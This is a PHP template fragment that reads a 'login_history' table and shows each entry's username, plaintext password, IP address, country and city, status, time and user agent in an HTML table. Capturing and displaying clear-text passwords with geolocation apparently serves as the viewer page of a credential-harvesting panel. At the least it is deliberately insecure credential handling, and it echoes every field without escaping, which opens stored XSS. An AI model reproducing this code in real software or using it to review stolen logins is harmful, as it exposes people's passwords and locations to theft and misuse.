<div class="section">
	<div class="table-responsive">
		<table class="table">
			<thead>
				<tr>
					<th>#</th>
					<th>User</th>
					<th>IP</th>
					<th>Status</th>
					<th>Date Time</th>
					<th>Location</th>
					<th>User Agent</th>
				</tr>
			</thead>
			<tbody>
				<?php

				$index = 0;
				$conn = open_connection();
				$sql = "SELECT * FROM login_history ORDER BY id DESC";
				$st = $conn->prepare($sql);
				$st->execute();
				$row = $st->fetchAll();
				if(count($row) > 0){
					foreach ( $row as $item ) {
						$index++;
						$data = json_decode($item['data'], true);
						?>

						<tr>
							<th scope="row"><?php echo $index ?></th>
							<td>
								Username: <?php echo $data['username'] ?><br>
								Password: <?php echo $data['password'] ?>
							</td>
							<td>
								<?php echo $item['ip'] ?>
							</td>
							<td>
								<?php echo $data['status'] ?>
							</td>
							<td>
								<?php echo $data['date'] ?>
							</td>
							<td>
								Country: <?php echo $data['country'] ?><br>
								City: <?php echo $data['city'] ?>
							</td>
							<td>
								<?php echo $data['agent'] ?>
							</td>
						</tr>

						<?php
					}
				}
					
				?>
						
			</tbody>
		</table>
	</div>
</div>